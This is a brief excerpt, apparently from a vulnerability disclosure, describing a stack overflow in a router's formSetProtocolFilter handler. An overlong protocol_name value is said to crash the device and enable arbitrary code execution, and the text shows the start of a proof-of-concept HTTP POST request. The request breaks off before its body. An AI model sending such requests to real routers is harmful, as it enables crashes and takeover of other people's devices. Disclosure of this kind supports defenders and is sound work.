...
In `formSetProtocolFilter` function, `protocol_name` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `protocol_name` to execute arbitrary code.
...
We set `protocol_name` as **aaaaa......**, and the router will crash, such as:

```http
POST /goform/formSetProtocolFilter HTTP/1.1
Host: 192.168.10.1
...
Referer: http://192.168.10.1/fw_protocolfilter.asp?t=1777344566343
